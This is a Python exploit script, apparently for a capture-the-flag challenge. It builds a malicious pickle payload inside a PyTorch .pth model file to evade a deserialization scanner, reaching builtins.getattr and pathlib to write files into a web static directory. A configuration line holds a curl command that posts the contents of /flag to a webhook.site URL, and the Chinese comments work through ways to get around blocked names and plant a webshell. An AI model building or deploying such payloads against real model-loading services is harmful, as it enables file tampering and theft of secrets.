import pickle
import zipfile
import io
import torch

# CONFIGURATION
WEBHOOK_URL = "https://webhook.site/2836268e-59ee-4f9e-a0e7-8b02441c2a11" 
CMD = f"curl -X POST -d \"$(cat /flag)\" {WEBHOOK_URL}; cp /flag /app/static/flag.txt"

# V17: 利用 __dict__ 写入绕过 (State Update)
# Pickle 允许通过 `b` (BUILD) 指令调用 setState 来更新对象的 __dict__。
# 如果我们能创建一个对象，其 __dict__ 被更新后，能触发某些行为。
# 但通常我们需要触发代码执行。
#
# 让我们尝试利用 `functools.partial`。
# 它是标准的 Python 对象。
# GLOBAL 'functools' 'partial'
# partial(subprocess.Popen, shell=True)
# 然后我们调用它?
#
# 或者，我们利用 `collections.deque` 的构造函数执行迭代？
# deque(map(os.system, [cmd]), maxlen=0)
# 这个需要 `os.system`。
#
# 回到字符串混淆。
# 如果扫描器能够模拟 'sys' + 'tem'，那它有点强。
# 但也许它只是禁止了 `getattr`？
# 
# 如果禁止了 `getattr`，我们将无法动态获取属性。
# 必须使用 GLOBAL 或 STACK_GLOBAL 直接引用。
# 
# 让我们试试 GLOBAL 'torch' 'system' ? 不存在。
# GLOBAL 'os' 'system' 被禁。
#
# 让我们寻找一个现成的函数，它在 `builtins` 或 `torch` 中，可以执行代码。
# `exec`, `eval` 在 builtins, 被禁。
# `__import__` 在 builtins, 被禁。
# `compile` ? 即使 compile 了也需要 exec。
#
# 让我们尝试利用 `torch.serialization` 中的漏洞？或者 `pathlib.Path`?
# `pathlib.Path('file').write_text('content')`
# 我们可以写一个 webshell 到 static 目录！
# 不需要 execution，只需要 file write。
#
# 目标：pathlib.Path('/app/static/shell.py').write_text('...')
# 1. Import pathlib.Path
# 2. Path('/app/static/shell.py')
# 3. Call write_text(payload)
# 
# 静态文件通常在 webroot。
# 题目有一个 `webui_with_api.py`。
# 如果能覆盖它...
#
# 让我们尝试写 flag.txt 到 static 目录。
# 
# OPCODE:
# GLOBAL 'pathlib' 'Path'
# PUSH '/app/static/pwn.txt' (Maybe /static ?)
# REDUCE -> Path obj
# STACK_GLOBAL 'getattr' (Risk) -> No, we can call method directly?
# Pickle cannot call method directly unless we get it first.
# 
# So we need getattr(path_obj, 'write_text').
# 
# Is there a file write function exposed directly?
# `torch.save` writes file.
# `builtins.open` ?
# GLOBAL 'builtins' 'open'
# open('/app/static/pwn.txt', 'w').write('FLAG')
#
# 需要:
# 1. f = open(...)
# 2. f.write(...)
#
# Pickle reduce 只能单步。
# 有没有函数能一步写入？
# `pathlib.Path(...).write_text(...)` 是最方便的。
#
# 让我们试试 `builtins.print("pwn", file=open("...", "w"))`?
# builtins.print 也是个函数。
#
# 方案17: 利用 `builtins.open` 覆盖文件
# 如果不能RCE，我们就写文件。
# 写什么？写一个 JSP/PHP/ASP... 不对这是 Python。
# 写一个 .py 文件，但是服务器已经在运行了。
#
# 让我们尝试写一个简单的 flag 请求脚本到 '/tmp/pwn' 这种？没用。
#
# 让我们专注于：如果扫描器封锁了 getattr。
# 我们还能怎么获取属性？
# `inst.__dict__['attr']` 
# Pickle 的 `BUILD` 指令会把字典 update 到 `inst.__dict__`。
# 但这只改变数据，不返回属性方法。
#
# 让我们尝试利用 `types.FunctionType` 构造函数。
# 
# 或者... 我们可以利用 `setattr`。
# setattr(obj, name, value)
# setattr(base_obj, '__class__', malicious_class)
#
# 让我们尝试最简单的：GLOBAL 'builtins' 'open'
# 如果 open 没被禁。

def push_str(s):
    b = s.encode('utf-8')
    return b'X' + (len(b)).to_bytes(4, 'little') + b

STACK_GLOBAL = b'\x93'
REDUCE = b'R'
TUPLE1 = b'\x85'
TUPLE2 = b'\x86'
TUPLE3 = b'\x87'

pkl = b'\x80\x02'

# 1. open('/app/static/hacked.txt', 'w')
# 假设 static 目录可写，且映射到 /static
# (题目源码有 "static" 目录吗？fetch_webpage 没看到明显的 static 目录，但可能有 /static 路由)
# 
# 无论如何，如果能 open，说明我们绕过了检测。
# 我们可以尝试覆盖 'nailong.pth' ?
# 
# 让我们构造:
# f = open('/app/static/flag.txt', 'w')
# f.write('test') 
# 
# Pickle 无法容易地链式调用。
# 除非: map(method, iter)
#
# 让我们尝试 `pathlib.Path`
pkl += push_str('pathlib')
pkl += push_str('Path')
pkl += STACK_GLOBAL
pkl += push_str('/app/static/hacked.txt') # Target path
pkl += TUPLE1
pkl += REDUCE # Path obj
pkl += b'q\x00' # memo 0

# getattr(path, 'write_text')
pkl += push_str('builtins')
pkl += push_str('getattr')
pkl += STACK_GLOBAL
pkl += b'h\x00'
pkl += push_str('write_text')
pkl += TUPLE2
pkl += REDUCE # write_text method

# write_text('hack')
pkl += push_str('hack')
pkl += TUPLE1
pkl += REDUCE

pkl += b'.'

def create_torch_zip(pickle_bytes):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_STORED) as zf:
        zf.writestr('archive/data.pkl', pickle_bytes)
        zf.writestr('archive/version', b'3\n')
    return buffer.getvalue()

if __name__ == "__main__":
    final_zip = create_torch_zip(pkl)
    with open("nailong_payload_v17.pth", "wb") as f:
        f.write(final_zip)
    print("[+] Generated nailong_payload_v17.pth (pathlib.write_text)")
